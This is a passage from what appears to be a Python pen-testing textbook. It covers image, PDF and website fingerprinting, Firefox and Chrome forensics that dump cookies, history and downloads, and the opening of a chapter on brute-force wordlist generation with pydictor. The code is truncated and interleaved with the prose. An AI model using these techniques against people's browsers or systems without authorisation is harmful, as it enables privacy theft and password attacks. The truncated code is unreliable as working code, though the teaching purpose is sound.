    return d + (m / 60.0) + (s / 3600.0) 
def decode_gps_info(exif): 
    gpsinfo = {} 
    if 'GPSInfo' in exif: 
        for key in exif['GPSInfo'].keys(): 
            decode = GPSTAGS.get(key,key) 
            gpsinfo[decode] = exif['GPSInfo'][key] 
        exif['GPSInfo'] = gpsinfo 
        latitude = exif['GPSInfo']['GPSLatitude'] 
        latitude_ref = exif['GPSInfo']['GPSLatitudeR
        longitude = exif['GPSInfo']['GPSLongitude'] 
        longitude_ref = exif['GPSInfo']['GPSLongitud
        if latitude: 
            latitude_value = convert_to_degress(lati
            if latitude_ref != 'N': 
                latitude_value = -latitude_value 
        else: 
            return {} 
        if longitude: 
            longitude_value = convert_to_degress(lon
            if longitude_ref != 'E': 
                longitude_value = -longitude_value 
        exif['GPSInfo'] = {"Latitude" : latitude_val

geopositioning in the GPSInfo object, then we proceed to extract the
information about the GPS metadata contained in this object. The
following represents our main function, printMetadata(), which
extracts metadata from images inside the images directory:
In the following output, we are geĴing information related to the
GPSInfo object about the latitude and longitude:
def printMetadata(): 
    for dirpath, dirnames, files in os.walk("images"
        for name in files: 
            print("[+] Metadata for file: %s " %(dir
            try: 
                exifData = {} 
                exif = get_exif_metadata(dirpath+os
                for metadata in exif: 
                    print("Metadata: %s - Value: %s 
                print("\n") 
            except: 
                import sys, traceback 
                traceback.print_exc(file=sys.stdout)
if __name__ == "__main__": 
    printMetadata() 
$ python extractDataFromImages.py 
[+] Metadata for file: images/image.jpg  
{'GPSVersionID': b'\x00\x00\x02\x02', 'GPSLatitudeRe
Metadata: GPSInfo - Value: {'Latitude': 32.078747222
Metadata: ResolutionUnit - Value: 2  

There are other modules that support EXIF data extraction, such as
the ExifRead module (https://pypi.org/project/ExifRead).
We can install this module with the following command:
$ pip install exifread 
In this example, we are using this module to get the EXIF data. You
can ﬁnd the following code in the tags_exifRead.py ﬁle in the
exiftags folder:
import exifread 
file = open('images/image.jpg', 'rb') 
tags = exifread.process_file(file) 
for tag in tags.keys(): 
    print("Key: %s, value %s" % (tag, tags[tag])) 
In the previous script, we are opening the image ﬁle in read/binary
mode, and with the process_file() method from the exifread
module, we can get all tags in a dictionary format, mapping names
of EXIF tags to their values. Finally, we are using the keys()
method to iterate through this dictionary to get all the EXIF tags. In
the following partial output, we can see the execution of the
previous script:
Metadata: ExifOffset - Value: 146  
Metadata: Make - Value: Canon  
Metadata: Model - Value: Canon EOS-5 
... 

In this section, we have reviewed how to extract EXIF metadata,
including GPS tags, from images with PIL and EXIFRead modules.
Now that we have reviewed select modules that can be used to
extract metadata from images, we are going to review the main
modules that we can ﬁnd in Python to extract metadata from PDF
documents.
Extracting metadata from PDF
documents
Document metadata is a type of information that is stored within a
ﬁle and is used to provide additional information about that ﬁle.
This information could be related to the software used to create the
document, the name of the author or organization, as well as the
date and time the ﬁle was created or modiﬁed.
Each application stores metadata diﬀerently, and the amount of
metadata that is stored in a document will almost always depend on
the software used to create the document. In this section, we will
$ python tags_exifRead.py 
Key: Image Make, value Canon 
Key: Image Model, value Canon EOS-5 
Key: Image XResolution, value 300 
Key: Image YResolution, value 300 
Key: Image ResolutionUnit, value Pixels/Inch 
Key: Image Software, value Adobe Photoshop CS2 Windo
.... 

review how to extract metadata from PDF documents with the
PyPDF2 and PyMuPDF modules.
Extracting metadata with PyPDF2
We will start with PyPDF2, whose module can be installed directly
with the following command:
$ pip install PyPDF2 
This module oﬀers us the ability to extract document information
using the PdfFileReader class and the getDocumentInfo()
method, which returns a dictionary with the data of the document.
We could start by extracting the number of pages using the
getNumPages() method from the PdfFileReader class. We could
also use the output of the pdfinfo command to obtain this
information. You can ﬁnd the following code in the
get_num_pages_pdf.py ﬁle in the pypdf2 folder:
from PyPDF2 import PdfFileReader 
pdf = PdfFileReader(open('pdf/XMPSpecificationPart3
print(str(pdf.getNumPages())) 
from subprocess import check_output 
def get_num_pages(pdf_path): 
    output = check_output(["pdfinfo", pdf_path]).dec
    pages_line = [line for line in output.splitlines
    num_pages = int(pages_line.split(":")[1]) 

The following script allows us to obtain the metadata of all the PDF
documents that are available in the pdf folder. You can ﬁnd the
following code in the extractDataFromPDF.py ﬁle in the pypdf2
folder:
In the previous code, we are using the walk function from the os
module to navigate all the ﬁles and directories that are included in a
    return num_pages 
print(get_num_pages('pdf/XMPSpecificationPart3.pdf')
from PyPDF2 import PdfReader, PdfFileWriter 
import os, time, os.path, stat 
from PyPDF2.generic import NameObject, createStringO
def get_metadata(): 
    for dirpath, dirnames, files in os.walk("pdf"): 
        for data in files: 
            ext = data.lower().rsplit('.', 1)[-1] 
            if ext in ['pdf']: 
                print("[--- Metadata : " + "%s ", (d
                print("-----------------------------
                pdfReader = PdfReader(open(dirpath+o
                info = pdfReader.getDocumentInfo() 
                for metaItem in info: 
                    print ('[+] ' + metaItem.strip( 
                pages = pdfReader.getNumPages() 
                print ('[+] Pages:', pages) 
                layout = pdfReader.getPageLayout() 
                print ('[+] Layout: ' + str(layout))

speciﬁc directory.
Once we have veriﬁed that the target exists, we use the os.walk
(target) function, which allows us to carry out an in-depth walk-
through of its target and, for each ﬁle found, it will analyze its
extension and invoke the corresponding function to print the
metadata if it is a supported extension. For each PDF document
found in the pdf folder, we are calling the getDocumentInfo(),
getNumPages(), and getPageLayout() methods.
Extensible Metadata Platform (XMP) is another metadata
speciﬁcation, usually applied to PDF-type ﬁles, but also to JPEGs,
GIFs, PNGs, and others. This speciﬁcation includes more generic
data such as information about titles, creators, and descriptions.
This module oﬀers us the ability to extract XMP data using the
PdfFileReader class and the getXmpMetadata() method, which
returns a class of type XmpInformation. In the following code, we
are using this method to get XMP information related to the
document, such as the contributors, publisher, and PDF version:
xmpinfo = pdfReader.getXmpMetadata() 
if hasattr(xmpinfo,'dc_contributor'): print ('[+] Co
if hasattr(xmpinfo,'dc_identifier'): print ( '[+] Id
if hasattr(xmpinfo,'dc_date'): print ('[+] Date:', x
if hasattr(xmpinfo,'dc_source'): print ('[+] Source
if hasattr(xmpinfo,'dc_subject'): print ('[+] Subjec
if hasattr(xmpinfo,'xmp_modifyDate'): print ('[+] Mo
if hasattr(xmpinfo,'xmp_metadataDate'): print ('[+] 
if hasattr(xmpinfo,'xmpmm_documentId'): print ('[+] 
if hasattr(xmpinfo,'xmpmm_instanceId'): print ('[+] 

In the following output, we can see the execution of the previous
script over a PDF that contains both types of metadata:
if hasattr(xmpinfo,'pdf_keywords'): print ('[+] PDF-
if hasattr(xmpinfo,'pdf_pdfversion'): print ('[+] PD
if hasattr(xmpinfo,'dc_publisher'): 
    for published in xmpinfo.dc_publisher: 
        if publisher: 
            print ("[+] Publisher:\t" + publisher) 
$ python extractDataFromPDF.py 
----------------------------------------------------
[--- Metadata : pdf/XMPSpecificationPart3.pdf 
----------------------------------------------------
PdfReadWarning: Xref table not zero-indexed. ID numb
[+] CreationDate: D:20080916081940Z 
[+] Subject: Storage and handling of XMP in files, a
[+] Copyright: Copyright 2008, Adobe Systems Incorpo
[+] Author: Adobe Developer Technologies 
[+] Creator: FrameMaker 7.2 
[+] Keywords: XMP metadata  Exif IPTC PSIR  file I/O
[+] Producer: Acrobat Distiller 8.1.0 (Windows) 
[+] ModDate: D:20080916084343-07'00' 
[+] Marked: True 
[+] Title: XMP Specification Part 3: Storage in File
[+] Pages: 86 
... 
[+] PDF-Keywords: XMP metadata  Exif IPTC PSIR  file
[+] PDF-Version: None 
[+] Size: 644542 bytes 

This module also provides a method called extractText() for
extracting text from PDF documents. The following script allows us
to obtain the text for a speciﬁc page number. You can ﬁnd the
following code in the extractTextFromPDF.py ﬁle in the pypdf2
folder:
We will continue by analyzing the PyMuPDF module, which allows
us to extract metadata from PDF documents.
Extracting metadata with PyMuPDF
Another way to extract text from PDF documents is using the
PyMuPDF module (https://github.com/pymupdf/PyMuPDF),
which is available in the PyPi repository, and you can install it with
the following command:
$ pip install PyMuPDF 
import PyPDF2 
pdfFile = open("pdf/XMPSpecificationPart3.pdf","rb")
pdfReader = PyPDF2.PdfFileReader(pdfFile) 
page_number= input("Enter page number:") 
pageObj = pdfReader.getPage(int(page_number)-1) 
text_pdf = str(pageObj.extractText()) 
print(text_pdf) 

Viewing document information and extracting text from a PDF
document is done similarly to with PyPDF2. The module to be
imported is called ﬁĵ and provides a method called load_page()
for loading a speciﬁc page, and for extracting text from a speciﬁc
page, we can use the get_text() method from the page object. The
following script allows us to obtain the text for a speciﬁc page
number. You can ﬁnd the following code in the
extractTextFromPDF_fitz.py ﬁle in the pymupdf folder:
import fitz 
pdf_document = "pdf/XMPSpecificationPart3.pdf" 
doc = fitz.open(pdf_document) 
print ("number of pages: %i" % doc.page_count) 
page_number= input("Enter page number:") 
 
page = doc.load_page(int(page_number)-1) 
page_text = page.get_text("text") 
print(page_text) 
This module allows extracting images from PDF ﬁles using the
get_page_images() method. You can ﬁnd the following code in the
extractImagesFromPDF_fitz.py ﬁle in the pymupdf folder:
import fitz 
pdf_document = fitz.open("pdf/XMPSpecificationPart3
for current_page in range(len(pdf_document)):   
    for image in pdf_document.get_page_images(curren
        xref = image[0] 
        pix = fitz.Pixmap(pdf_document, xref) 

The previous script extracts and saves all images that can be found
in the PDF document as PNG ﬁles. This will be the output when
executing the previous script:
$ python extractImagesromPDF_fitz.py 
Extracted image page37-316.png 
Extracted image page62-410.png 
Now that we have reviewed the main modules for extracting
metadata from PDF documents, we are going to review the main
modules that we can ﬁnd in Python for extracting the technologies
that a website is using.
Identifying the technology used by
a website
The type of technology used to create a website aﬀects the way
information is recovered from a user navigation point of view. To
identify this information, you can make use of tools such as
Wappalyzer (https://www.wappalyzer.com) and builtwith
(https://builtwith.com).
A useful tool to verify the type of technologies a website is built with
is the BuiltWith module (https://pypi.org/project/builtwith),
which can be installed with this command:
        pix.save("page%s-%s.png" % (current_page, xr
        print("Extracted image page%s-%s.png" % (cur

$ pip install builtwith 
This module provides a method called parse(), which is passed by
the URL parameter and returns the technologies used by the website
as a response. In the following output, we can see the response for
two websites:
Wappalyzer
Another tool for uncovering this kind of information is Wappalyzer.
Wappalyzer has a database of web application signatures that allows
you to identify more than 900 web technologies from more than 50
categories. The tool analyzes multiple elements of a website to
determine its technologies using the following HTML elements:
HTTP response headers on the server
Meta HTML tags
JavaScript ﬁles, both separately and embedded in the HTML
Speciﬁc HTML content
HTML-speciﬁc comments
>>> import builtwith 
>>> builtwith.parse('http://python.org') 
{'web-servers': ['Nginx'], 'javascript-frameworks': 
>>> builtwith.parse('http://packtpub.com') 
{'cdn': ['CloudFlare'], 'font-scripts': ['Google Fon

python-Wappalyzer (https://github.com/chorsley/python-
Wappalyzer) is a Python interface for obtaining this information.
You can install it with the following command:
$ pip install python-Wappalyzer 
We could use this module to obtain information about technologies
used in the frontend and backend layers of a website:
WebApp Information Gatherer (WIG)
Another interesting tool for geĴing information about the server
version that is using a website is WebApp Information Gatherer
(WIG) (https://github.com/jekyc/wig). Wig is a tool developed
in Python 3 that can identify numerous Content Management
Systems (CMSes) and other administrative applications, such as the
web server version. Internally, it obtains the server version operating
>>> from Wappalyzer import Wappalyzer, WebPage 
>>> wappalyzer = Wappalyzer.latest() 
>>> webpage = WebPage.new_from_url('http://www.pytho
>>> wappalyzer.analyze(webpage) 
{'Varnish', 'jQuery UI', 'jQuery', 'Nginx', 'Moderni
>>> webpage = WebPage.new_from_url('http://www.packt
>>> wappalyzer.analyze(webpage) 
{'Google Font API', 'jQuery', 'Bootstrap', 'Google T
>>> wappalyzer.analyze_with_categories(webpage) 
{'Google Font API': {'categories': ['Font scripts']}

system using server and X-Powered-By headers website. These
headers are HTTP response headers that usually return what kind of
server it is.
You can download the source code with the following command:
$ git clone https://github.com/jekyc/wig 
These are the options provided by the wig script in the Python 3
environment when executing the following command:
In the following output, we can see the execution of the previous
script on the python.org website:
$ python wig.py -h 
usage: wig.py [-h] [-l INPUT_FILE] [-q] [-n STOP_AFT
              [-t THREADS] [--no_cache_load] [--no_c
              [--verbosity] [--proxy PROXY] [-w OUTP
              [url] 
$ python wig.py http://www.python.org    
____________________________________________________
IP                           Title 
151.101.132.223              Welcome to Python.org  
____________________________________________________
Name                         Versions               
Django                       1.10 | 1.10.1 | 1.10.2 
                             1.9.1 | 1.9.10 | 1.9.2 
                             1.9.7 | 1.9.8 | 1.9.9  

In the previous output, we can see how it detects the CMS version,
the nginx web server, and other interesting information, such as the
subdomains used by the python.org website.
Now that we have reviewed the main modules for mapping the
technologies that a website is using, we are going to review the tools
that we can use to extract metadata stored by Chrome and Firefox
browsers.
nginx               Platform                        
____________________________________________________
Name                         Page Title             
https://blog.python.org:443  Python Insider         
____________________________________________________
URL                          Note                   
/robots.txt                  robots.txt index       
____________________________________________________
Affected                     #Vulns                 
Django 1.9                   4                      
Django 1.9.1                 4                      
Django 1.9.2                 3                      
Django 1.9.3                 1                      
Django 1.9.4                 1                      
Django 1.9.5                 1                      
Django 1.9.6                 1                      
Django 1.9.7                 1                      
Time: 31.5 sec               Urls: 644              

Extracting metadata from web
browsers
In the following section, we are going to analyze how to extract
metadata such as downloads, history, and cookies from the Chrome
and Firefox web browsers.
Firefox forensics with Python
Firefox stores browser data in SQLite databases whose location
depends on the operating system. For example, in the Linux
operating system, this data is located at
/home/<user>/.mozilla/Firefox/.
For example, in the places.sqlite ﬁle, we can ﬁnd the database
that contains the browsing history, and it can be examined using any
SQLite browser. In the following screenshot, we can see the SQLite
browser with the tables available in the places.sqlite database:

Figure 12.1: The places.sqlite database
We could build a Python script that extracts information from the
moz_downloads, moz_cookies, and moz_historyvisits tables.
We are geĴing downloads from the moz_downloads table, and for
each result, we print information about the ﬁlename and the
download date. You can ﬁnd the following code in the
firefoxParseProfile.py ﬁle inside the firefox_profile folder:
import sqlite3 
import os 
def getDownloads(downloadDB): 
    try: 
        connection = sqlite3.connect(downloadDB) 
        cursor = connection.cursor() 
        cursor.execute('SELECT name, source, datetim

In the following code, we are geĴing cookies from the moz_cookies
table, and for each result, we print information about the host and
the cookie name and value:
In the following code, we are geĴing the history from the
moz_places and moz_historyvisits tables, and for each result,
we print information about the date and site visited:
        print('\n[*] --- Files Downloaded --- ') 
        for row in cursor: 
            print('[+] File: ' + str(row[0]) + ' fro
    except Exception as exception: 
        print('\n[*] Error reading moz_downloads dat
def getCookies(cookiesDB): 
    try: 
        connection = sqlite3.connect(cookiesDB) 
        cursor = connection.cursor() 
        cursor.execute('SELECT host, name, value FRO
        print('\n[*] -- Found Cookies --') 
        for row in cursor: 
            print('[+] Host: ' + str(row[0]) + ', Co
    except Exception as exception: 
        print('\n[*] Error reading moz_cookies datab
def getHistory(placesDB): 
    try: 
        connection = sqlite3.connect(placesDB) 

In our main program, we make the calls to the previously deﬁned
functions, passing as a parameter the corresponding SQLite database
ﬁle for each one.
def main(): 
    if os.path.isfile('downloads.sqlite'): 
        getDownloads('downloads.sqlite') 
    else: 
        print('[!] downloads.sqlite not found ') 
    if os.path.isfile('cookies.sqlite'): 
        getCookies('cookies.sqlite') 
    else: 
        print('[!] cookies.sqlite not found ') 
    if os.path.isfile('places.sqlite'): 
        getHistory('places.sqlite') 
    else: 
        print('[!] places.sqlite not found: ') 
if __name__ == '__main__': 
    main() 
To execute the previous script, you need to copy the SQLite
databases into the same folder where you are running the script. In
        cursor = connection.cursor() 
        cursor.execute("select url, datetime(visit_d
        print('\n[*] -- Found History --') 
        for row in cursor: 
            print('[+] ' + str(row[1]) + ' - Visited
    except Exception as exception: 
        print('\n[*] Error reading moz_places,moz_hi

the GitHub repository, you can ﬁnd examples of these databases.
You could also try the SQLite ﬁles found in the path of your
browser’s conﬁguration. In the execution of the previous script, we
can see the following output:
Now that we have reviewed the main ﬁles where the downloads,
cookies, and stored history of the Firefox browser are located, we are
going to review the module ﬁrefox-proﬁle
(https://pypi.org/project/firefox-profile), which
automates the process of extracting Firefox proﬁle metadata.
$ pip install firefox-profile 
We can build a Python script that extracts information from the
Firefox proﬁles. You can ﬁnd the following code in the
get_firefox_profiles.py ﬁle inside the firefox_profile
folder:
$ python firefoxParseProfile.py 
[*] --- Files Downloaded ---  
[+] File: python-nmap-0.1.4.tar.gz from source: http
[*] -- Found Cookies -- 
[+] Host: .stackoverflow.com, Cookie: prov, Value: 6
[*] -- Found History -- 
[+] 2012-06-20 02:52:52 - Visited: http://www.google
[+] 2012-06-20 02:52:58 - Visited: https://www.googl

With the execution of the previous script, we can obtain those URLs
the user has used in the navigation with their Firefox proﬁle. The
following execution shows the URLs you have opened in your
current Firefox session.
from firefox_profile import FirefoxProfile 
for profile in FirefoxProfile.get_profiles(): 
    recovery_data = profile.get_recovery_data() 
    if recovery_data is None: 
        continue 
    for i, window in enumerate(recovery_data.windows
        print(f"window {i}") 
        print(f"  workspace: {window.workspace}") 
        print(f"  zindex: {window.zindex}") 
        print(f"  size: {window.size!r}") 
        print(f"  position: {window.position!r}") 
        print(f"  mode: {window.mode}") 
        print(f"  tabs:") 
        for j, tab in enumerate(window.tabs): 
            print(f"    tab {j}") 
            print(f"      url: {tab.url}") 
            print(f"      title: {tab.title}") 
            print(f"      last_accessed: {tab.last_a
$ python3.10 get_firefox_profiles.py 
window 0 
  workspace: None 
  zindex: 1 
  size: (656, 552) 

In the same way that we can extract metadata from the Firefox
browser, we can do so with Chrome since the information is also
saved in a SQLite database.
Chrome forensics with Python
Google Chrome stores browser data in SQLite databases located in
the following folders, depending on the operating system:
Windows 7 and 10: C:\Users\
[USERNAME]\AppData\Local\Google\Chrome\
Linux: /home/$USER/.config/google-chrome/
macOS: ~/Library/Application Support/Google/Chrome/
For example, in the History SQLite ﬁle, we can ﬁnd the database
that contains the browsing history under the Default folder, and it
can be examined using any SQLite browser.
In the following screenshot, we can see the SQLite browser with
tables available in the history database:
  position: (35, 32) 
  mode: maximized 
  tabs: 
    tab 1 
      url: https://codered.eccouncil.org/courseVideo
      title: Module 5: Network Security Controls: Te
      last_accessed: 2023-03-22 21:47:23.586000 

Figure 12.2: Tables available in the history SQLite database
Between the tables for the history database and the associated ﬁelds
and columns, we can highlight the following:
downloads: id, current_path, target_path, start_time,
received_bytes, total_bytes, state, danger_type,
interrupt_reason, end_time, opened, referrer,
by_ext_id, by_ext_name, etag, last_modified,
mime_type, and original_mime_type
downloads_url_chains: id, chain_index, url
keyword_search_terms: keyword_id, url_id, lower_term,

and term
meta: key, value
segment_usage: id, segment_id, time_slot, and
visit_count
segments: id, name, and url_id
urls: id, url, title, visit_count, typed_count,
last_visit_time, hidden, and favicon_id
In the following screenshot, you can see the columns available in the
downloads table:
Figure 12.3: Columns available in the downloads SQLite table
We could build a Python script that extracts information from the
downloads table. You only need to use the sqlite3 module and

execute the following query over the downloads table:
You can ﬁnd the following code in the chrome_downloads.py ﬁle
inside the chrome folder:
SELECT target_path, referrer, start_time, end_time, 
import sqlite3 
import datetime 
import optparse 
def fixDate(timestamp): 
    epoch_start = datetime.datetime(1601,1,1) 
    delta = datetime.timedelta(microseconds=int(time
    return epoch_start + delta 
def getMetadataHistoryFile(locationHistoryFile): 
    sql_connect = sqlite3.connect(locationHistoryFil
    for row in sql_connect.execute('SELECT target_pa
        print ("Download:",str(row[0])) 
        print ("\tFrom:",str(row[1])) 
        print ("\tStarted:",str(fixDate(row[2]))) 
        print ("\tFinished:",str(fixDate(row[3]))) 
        print ("\tSize:",str(row[4])) 
def main(): 
    parser = optparse.OptionParser('--location <targ
    parser.add_option('--location', dest='location',
    (options, args) = parser.parse_args() 
    location = options.location 
    getMetadataHistoryFile(location) 

In the previous code, we are deﬁning functions for transforming
date format and query information related to browser downloads
from the downloads table. To execute the previous script, Chrome
needs to have been closed, and you need to pass the location of the
history ﬁle database located in the /home/linux/.config/google-
chrome/Default folder as a parameter:
In this section, we reviewed how the Chrome browser stores
information in an SQLite database. Next, we’ll analyze a tool that
allows us to automate this process with a terminal or web interface.
Chrome forensics with Hindsight
Hindsight
(https://github.com/obsidianforensics/hindsight) is an
open-source tool for parsing a user’s Chrome browser data and
allows you to analyze several diﬀerent types of web artifacts,
including URLs, download history, cache records, bookmarks,
if __name__ == '__main__': 
    main() 
$ python ChromeDownloads.py --location /home/linux/
Download: /home/linux/Descargas/Python-3.10.10.tar.x
From: https://www.python.org/downloads/release/pytho
Started: 2023-03-22 21:24:30.488851 
Finished: 2023-03-22 21:24:33.888085 
Size: 19627028 

preferences, browser extensions, HTTP cookies, and local storage
logs in the form of cookies. This tool can be executed in two ways:
The ﬁrst one is using the hindsight.py script.
The second one is by executing the hindsight_gui.py script,
which provides a web interface for entering the location where
the Chrome proﬁle is located.
To execute this script, we ﬁrst need to install the modules available
in requirements.txt with the following command:
$ python install -r requirements.txt 
Executing hindsight.py from the command line requires passing
the location of your Chrome proﬁle as a mandatory input parameter:
usage: hindsight.py [-h] -i INPUT [-o OUTPUT] [-b {C
                    [-f {sqlite,jsonl,xlsx}] [-l LOG
                    [-d {mac,linux}] [-c CACHE] 
Hindsight v20200607 - Internet history forensics for
This script parses the files in the Chrome/Chromium/
   against the data, and then outputs the results in
optional arguments: 
  -h, --help            show this help message and e
  -i INPUT, --input INPUT 
                        Path to the Chrome(ium) prof
                        "Default") 

The location of your Chrome proﬁle depends on your operating
system. The Chrome data folder default locations are as follows:
WinXP: <userdir>\Local Settings\Application
Data\Google\Chrome \User Data\Default\
Vista/7/8/10:
<userdir>\AppData\Local\Google\Chrome\User
Data\Default\
Linux: <userdir>/.config/google-chrome/Default/
OS X: <userdir>/Library/Application
Support/Google/Chrome/Default/
iOS:
\Applications\com.google.chrome.ios\Library\Applica
tion Support\Google\Chrome\Default\
Chromium OS: \home\user\<GUID>\
We could execute the following command, seĴing the --input
parameter with the default proﬁle over a Linux Google Chrome
location. The Chrome browser should be closed before running
Hindsight:
Alternatively, you can run the hindsight_gui.py script and visit
http://localhost:8080 in a browser:
$ python hindsight.py --input /home/linux/.config/go
$ python hindsight_gui.py 
Bottle v0.12.18 server starting up (using WSGIRefSer

In the following screenshot, we can see the user interface where the
only required ﬁeld is Proﬁle Path, corresponding to the path to the
location of the Chrome proﬁle you wish to analyze.
Figure 12.4: Hindsight user interface
When running the tool on the directory containing the Chrome
proﬁle, we get the following output where we see the information
that it has been able to extract.
Listening on http://localhost:8080/ 
Profile: /home/linux/.config/google-chrome/Default 
                     Detected Chrome version:       
                                 URL records:       

In the following image, we can see the result of the execution, along
with the artifacts that we can download, among which we can
highlight the XLSX, JSONL, and SQLite ﬁles.
                            Download records:       
                           GPU Cache records:       
                              Cookie records:       
                            Autofill records:       
                       Local Storage records:       
                     Session Storage records:       
                                  Extensions:       
                          Login Data records:       
                            Preference Items:       
                Site Characteristics records:       
                                HSTS records:       
          Chrome Extension Names (v20210424):   - 0 
       Generic Timestamp Decoder (v20160907):     - 
  Google Analytics Cookie Parser (v20170130):       
                 Google Searches (v20160912):      -
    Load Balancer Cookie Decoder (v20200213):       
         Quantcast Cookie Parser (v20160907):       
             Query String Parser (v20170225):    - 0
         Time Discrepancy Finder (v20170129):     - 

Figure 12.5: Hindsight results
If we try to run the script with the Chrome browser
process open, it will block the process since we need to
close the Chrome browser before running it. This is
the error message returned when you try to execute
the script with the Chrome process running:
SQLite3 error; is the Chrome profile in
use? Hindsight cannot access history files
if Chrome has them locked. This error most
often occurs when trying to analyze a local
Chrome installation while it is running.
Please close Chrome and try again.

Summary
One of the objectives of this chapter was to learn about the modules
that allow us to extract metadata from documents and images, as
well as to extract geolocation information from IP addresses and
domain names.
We discussed how to obtain information from a website, such as
how technologies and CMSes are being used on a certain web page.
Finally, we reviewed how to extract metadata from web browsers
such as Chrome and Firefox. All the tools reviewed in this chapter
allow us to get information that may be useful for later phases of our
pen-testing or audit process.
In the next chapter, we will explore the main tools we have in the
Python ecosystem for dictionary builders for brute-force aĴacks.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which method within the maxminddb-geolite2 module allows
us to obtain the geolocation from the IP address passed by the
parameter?
2. Which module, class, and method can we use to obtain
information from a PDF document?
3. Which module allows us to extract image information from tags
in EXIF format?

4. What is the name of the database and tables for storing
information related to user history in the Firefox browser?
5. What is the name of the database and tables for storing
information related to user downloads in the Chrome browser?
Further reading
At the following links, you can ﬁnd more information about the tools
mentioned in this chapter and the oﬃcial Python documentation for
some of the modules commented on:
GeoIP documentation:
https://geoip2.readthedocs.io/en/latest/
Maxmind databases: https://www.maxmind.com/en/geoip2-
services-and-databases?lang=en
Maxminddb-geolite2:
https://snyk.io/advisor/python/maxminddb-geolite2
Exiftags documentation:
https://pillow.readthedocs.io/en/latest/reference/E
xifTags.html
Geo-Recon: An OSINT CLI tool designed to track IP reputation
and geolocation lookup
(https://github.com/radioactivetobi/geo-recon)
PyPDF2 documentation: https://pypdf2.readthedocs.io
PDFMiner (https://pypi.org/project/pdfminer) is a tool
developed in Python that works correctly in Python 3 using the
PDFMiner.six package

(https://github.com/pdfminer/pdfminer.six). Both
packages allow you to analyze and convert PDF documents
PDFQuery (https://github.com/jcushman/pdfquery) is a
library that allows you to extract content from a PDF ﬁle using
jQuery and XPath expressions with scraping techniques
Chromensics – Google Chrome Forensics:
https://sourceforge.net/projects/chromensics.
Extract all interesting forensic information on Firefox:
https://github.com/Busindre/dumpzilla
Imago https://github.com/redaelli/imago-forensics is a
Python tool that extracts digital evidence from images
recursively. This tool is useful throughout digital forensic
investigation. If you need to extract digital evidence and you
have a lot of images, using this tool, you will be able to compare
them easily.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

13
Python Tools for Brute-Force
Attacks
Within the ﬁeld of cybersecurity, there are several tasks that focus on
performing brute-force procedures, allowing us to try diﬀerent
combinations and permutations of words that we ﬁnd in a text ﬁle
called dictionary.
This chapter covers the main tools we have in the Python ecosystem
for dictionary builders for brute-force aĴacks. The most common
applications of brute-force aĴacks are cracking passwords and
bypassing the login web page authentication. We will cover the
process of executing brute-force aĴacks and the tools used to execute
these aĴacks against web applications and password-protected ZIP
ﬁles.
The following topics will be covered in this chapter:
Learning about and understanding tools for dictionary builders
for brute-force aĴacks.
Learning about tools for brute-force aĴacks in Python.
Understanding how to execute brute-force aĴacks on web
applications.

Understanding and analyzing how to execute brute-force
aĴacks on password-protected ZIP ﬁles.
Technical requirements
Before you start reading this chapter, you should know the basics of
Python programming and have some basic knowledge about HTTP.
We will work with Python version 3.10, available at
www.python.org/downloads.
Some of the examples in this chapter require the installation of the
following programs:
Nmap port scanner: https://nmap.org
Docker: https://www.docker.com
Docker Compose: https://docs.docker.com/compose
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter13.
Dictionary builders for brute-force
attacks
In this section, we will review the main tools to build dictionaries we
could use in a brute-force aĴack process.

Brute-force dictionary generation with
pydictor
pydictor (https://github.com/LandGrey/pydictor) is a Python
script that provides diﬀerent options to customize the generation of
dictionaries, including the application of regular expressions, the use
of plugins, and encrypting each word in the dictionary with an
algorithm such as SHA, MD5, or DES, among other things.
To perform the installation, it would be enough to clone/download
the repository from GitHub and run the pydictor.py script with
the following commands:
In the following screenshot, you can see the options available for this
script:
$ git clone --depth=1 --branch=master https://www.gi
Cloning in 'pydictor'... 
warning: redirecting to https://github.com/landgrey/
remote: Enumerating objects: 111, done. 
remote: Counting objects: 100% (111/111), done. 
remote: Compressing objects: 100% (82/82), done. 
remote: Total 111 (delta 30), reused 76 (delta 25), 
$ cd pydictor/ 
$ chmod +x pydictor.py 
$ python pydictor.py -h 

Figure 13.1: Pydictor options
Below are some commands for the basic use of the tool to
understand how it works and how easy it is to use.
The following command generates a ﬁle called test1.txt, where
each line will contain a word from the dictionary following a
number base, with a length of exactly 4 (the default value if the -len
option is not speciﬁed):

The test1.txt ﬁle contains 11,111 lines with the following content:
0000, 0001, ...., 9999 
The following command generates a ﬁle, test2.txt, where each
line will contain one word from the dictionary following a number
base, with a length of exactly 6:
$ python pydictor.py -base d -o test1.txt 
                              _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
[+] A total of :11111 lines 
[+] Store in   :/home/linux/Downloads/pydictor/resul
[+] Cost       :0.0807 seconds 
$ python pydictor.py -len 6 6 -base d -o test2.txt 
                              _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  
[+] A total of :1000000 lines 

The test2.txt ﬁle contains 1,000,000 lines with the following
content:
000000, 000001, ...., 999999 
The following command generates a ﬁle called test3.txt, where
each line will contain a dictionary word using lowercase alphabet
characters, with a length of exactly 5:
The test3.txt ﬁle contains 11,881,376 lines with the following
content:
aaaaaa, aaaab, aaaac, ...., zzzzzz 
[+] Store in   :/home/linux/Downloads/pydictor/resul
[+] Cost       :0.5863 seconds 
$ python pydictor.py -len 5 5 -base L -o test3.txt 
                              _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  
[+] A total of :11881376 lines 
[+] Store in   :/home/linux/Downloads/pydictor/resul
[+] Cost       :5.8195 seconds 

The following command generates a ﬁle called text4.txt, where
each line will contain a dictionary word using uppercase alphabetic
characters and the digits 0 to 9, with a length of exactly 5:
